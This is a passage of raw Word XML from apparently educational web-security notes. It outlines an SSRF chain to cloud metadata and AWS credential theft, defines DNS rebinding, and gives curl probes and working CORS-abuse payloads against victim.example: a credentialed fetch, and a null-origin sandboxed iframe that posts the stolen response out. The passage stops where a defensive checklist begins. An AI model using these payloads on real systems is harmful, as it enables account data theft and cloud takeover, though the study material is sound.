        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="119" w:name="_Toc208408590"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Chaining SSRF</w:t>
      </w:r>
      <w:bookmarkEnd w:id="119"/>
    </w:p>
    <w:p w14:paraId="72A66C64" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>SSRF → Metadata → Credential → RCE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7599347B" w14:textId="033A2E8D" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="008845E1">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Exploit SSRF to hit 169.254.169.254</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="117F5224" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="008845E1">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Extract AWS IAM creds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C7EE181" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="008845E1">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Use creds for S3/EC2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A9DF512" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="008845E1">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Upload malicious code → full cloud takeover</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68CF79E5" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>SSRF + File Upload</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A843588" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="008845E1">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Upload malicious script</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D069F76" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410" w:rsidP="008845E1">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="360"/>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Use SSRF to call internal admin panel to execute file</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="422051DA" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="120" w:name="_Toc208408591"/>
      <w:r>
        <w:t>DNS Rebinding</w:t>
      </w:r>
      <w:bookmarkEnd w:id="120"/>
    </w:p>
    <w:p w14:paraId="6CF0E5D2" w14:textId="77777777" w:rsidR="00B830E7" w:rsidRDefault="00353410">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>An attack where malicious domain resolves to different IPs over time, tricking victim’s browser/server into accessing internal/private resources.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15334F31" w14:textId="77777777" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="63979036" w14:textId="77777777" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18848C80" w14:textId="77777777" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="11AE3956" w14:textId="77777777" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="121" w:name="_Toc208408592"/>
      <w:r>
        <w:t>CORS (Cross-Origin Resource Sharing)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="121"/>
    </w:p>
    <w:p w14:paraId="63DA4892" w14:textId="77777777" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="481EE8F2" w14:textId="7AAEBE41" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="122" w:name="_Toc208408593"/>
      <w:r>
        <w:t>Threat model</w:t>
      </w:r>
      <w:bookmarkEnd w:id="122"/>
    </w:p>
    <w:p w14:paraId="64DB78EF" w14:textId="77777777" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="52BB4DAD" w14:textId="7B98E9CC" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t>Browsers enforce the Same-Origin Policy (SOP). CORS is a server-side mechanism that</w:t>
      </w:r>
      <w:r w:rsidR="00755C65">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>relaxes SOP for chosen origins. Misconfiguration lets an attacker origin read sensitive</w:t>
      </w:r>
      <w:r w:rsidR="00755C65">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>data while victim cookies are sent.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="769FD26A" w14:textId="77777777" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6C583447" w14:textId="66BC671C" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00755C65">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="123" w:name="_Toc208408594"/>
      <w:r>
        <w:t>Recon – What to check</w:t>
      </w:r>
      <w:bookmarkEnd w:id="123"/>
    </w:p>
    <w:p w14:paraId="0EDA66BB" w14:textId="77777777" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6BA3CCCD" w14:textId="77777777" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t>Example curl probes:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05F4CF82" w14:textId="77777777" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1BC96B72" w14:textId="50335CDD" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Curl -I </w:t>
      </w:r>
      <w:hyperlink r:id="rId15" w:history="1">
        <w:r w:rsidRPr="00130CEA">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://victim.example/api/account</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> -H “Origin: </w:t>
      </w:r>
      <w:hyperlink r:id="rId16" w:history="1">
        <w:r w:rsidRPr="00130CEA">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://attacker.example</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="192BB741" w14:textId="77777777" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D21ECFD" w14:textId="77777777" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="598D7E79" w14:textId="77777777" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2439DC9F" w14:textId="2F397F58" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Curl -I -X OPTIONS </w:t>
      </w:r>
      <w:hyperlink r:id="rId17" w:history="1">
        <w:r w:rsidRPr="00130CEA">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://victim.example/api/account \</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5AD1927B" w14:textId="77777777" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="34ED66E7" w14:textId="5AECDC20" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">  -H “Origin: </w:t>
      </w:r>
      <w:hyperlink r:id="rId18" w:history="1">
        <w:r w:rsidRPr="00130CEA">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://attacker.example</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>” \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12918D2E" w14:textId="77777777" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="74E1C858" w14:textId="15515A60" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">  -H “Access-Control-Request-Method: PUT”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14CFBF5F" w14:textId="77777777" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="00ED6C78" w14:textId="6D04D576" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00F43695">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="124" w:name="_Toc208408595"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Exploitable patterns &amp; payloads</w:t>
      </w:r>
      <w:bookmarkEnd w:id="124"/>
    </w:p>
    <w:p w14:paraId="2F66D99D" w14:textId="77777777" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="17B72159" w14:textId="6D7DFFBC" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Reflected Origin + Credentials</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="678712FB" w14:textId="77777777" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="43F01FDB" w14:textId="77777777" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t>&lt;script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E02EFAB" w14:textId="77777777" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="01B16E88" w14:textId="3BE7D76E" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t>Fetch(</w:t>
      </w:r>
      <w:hyperlink r:id="rId19" w:history="1">
        <w:r w:rsidRPr="00130CEA">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://victim.example/api/me</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>, {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EEA112E" w14:textId="77777777" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="44A1C6EA" w14:textId="264BF809" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">  Method: “GET”,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D58C824" w14:textId="77777777" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2202CB58" w14:textId="11E1D71E" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">  Credentials: “include”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="603FC6A2" w14:textId="77777777" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="09B422A0" w14:textId="77777777" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">}).then(r =&gt; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>r.text</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>()).then(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>console.log</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EA10B92" w14:textId="77777777" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6345C9C3" w14:textId="77777777" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t>&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="075A22FF" w14:textId="77777777" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="27FD4C5B" w14:textId="20064343" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Trusting null Origin via sandboxed iframe</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B670FFB" w14:textId="77777777" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7BDCF09D" w14:textId="363D41C5" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">&lt;iframe sandbox=”allow-scripts allow-forms” </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>srcdoc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>=’</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6607AE78" w14:textId="77777777" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4FBD1FF6" w14:textId="77777777" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">  &lt;script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25800F90" w14:textId="77777777" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3CE1D012" w14:textId="3C92ACA8" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">  Fetch(</w:t>
      </w:r>
      <w:hyperlink r:id="rId20" w:history="1">
        <w:r w:rsidRPr="00130CEA">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://victim.example/api/me</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>, {</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>credentials:”include</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>”})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DF80454" w14:textId="77777777" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6ECAD06C" w14:textId="16C00060" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    .then(r=&gt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>r.text</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>()).then(x=&gt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>parent.postMessage</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>(x,”*”));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75AAAB21" w14:textId="77777777" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2F740068" w14:textId="152C156C" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">  &lt;/script&gt;’&gt;&lt;/iframe&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10407385" w14:textId="77777777" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="139C71B6" w14:textId="573E9731" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00F43695">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="125" w:name="_Toc208408596"/>
      <w:r>
        <w:t>Defensive checklist</w:t>
      </w:r>
      <w:bookmarkEnd w:id="125"/>
    </w:p>
    <w:p w14:paraId="73C31606" w14:textId="77777777" w:rsidR="00623E4A" w:rsidRDefault="00623E4A" w:rsidP="00623E4A">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7E9DD17E" w14:textId="77777777" w:rsidR="00F43695" w:rsidRDefault="00623E4A" w:rsidP="005321D4">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
